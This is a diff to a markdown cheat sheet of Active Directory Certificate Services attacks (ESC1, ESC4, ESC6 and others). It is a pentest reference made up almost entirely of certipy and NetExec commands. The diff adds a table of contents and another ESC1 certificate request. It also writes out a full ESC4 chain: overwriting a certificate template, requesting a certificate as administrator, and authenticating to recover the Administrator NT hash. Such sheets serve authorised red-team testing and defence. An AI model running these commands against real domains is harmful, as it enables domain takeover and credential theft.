@@ -1,3 +1,13 @@
+# Attacks
+- [ESC1](#esc1)
+- [ESC3](#esc3)
+- [ESC4](#esc4)
+- [ESC6](#esc6)
+- [ESC7](#esc7)
+- [ESC8](#esc8)
+- [ESC9](#esc9)
+- [ESC13](#esc13)
+
 # Enumeration
 ### NetExec
 Find PKI Enrollment Services in Active Directory and Certificate Templates Names
@@ -7,7 +17,7 @@ nxc ldap ip -u username -p password -M adcs
 ### Certipy
 Search for vulnerable certificate templates
 ```
-certipy find -u username -p password -dc-ip ip -vulnerable -enabled
+certipy find -u username -p password -dc-ip ip -target dc -enabled -vulnerable -stdout
 ```
 List CAs, servers and search for vulnerable certificate templates
 ```
@@ -28,6 +38,10 @@ Use ability to enroll as a normal user & provide a user defined Subject Alternat
 ```
 certipy req -u computer_name -p computer_password -ca ca -target domain -template template -upn administrator@domain -dns domain -dc-ip ip
 ```
+Or
+```
+certipy req -u username -p password -ca ca -target domain -template template -upn administrator@domain -dns domain -dc-ip ip
+```
 Authenticate with the certificate and get the NT hash of the Administrator
 ```
 certipy auth -pfx pfx_file -domain domain -username username -dc-ip ip
@@ -46,13 +60,14 @@ Authenticate as Administrator
 certipy auth -pfx administrator.pfx -dc-ip ip
 ```
 ## ESC4
-Overwrite the configuration to make it vulnerable to ESC1
 ```
 certipy template -username username -password password -template template -save-old -dc-ip ip
 ```
-Now if you run this command, it should show that the certificate is vulnerable to ESC1
 ```
-certipy find -u username -p password -dc-ip ip -dns-tcp -ns ip -stdout -debug
+certipy req -u username -p password -dc-ip ip -ca ca -target dc -template template -upn administrator@domain
+```
+```
+certipy auth -pfx administrator.pfx -domain domain -username administrator -dc-ip ip
 ```
 ## ESC6
 ```
@@ -82,7 +97,7 @@ certipy req -username username@domain -password password -ca ca -target ip -retr
 ```
 Authenticate with the certificate and get the NT hash of the Administrator
 ```
-certipy auth -pfx $pfx -domain domain -username username -dc-ip ip
+certipy auth -pfx pfx_file -domain domain -username username -dc-ip ip
 ```
 ## ESC8
 If there is an ADCS Server that is not on the DC and has Web Enrollement activated we might be able to exploit ESC8.
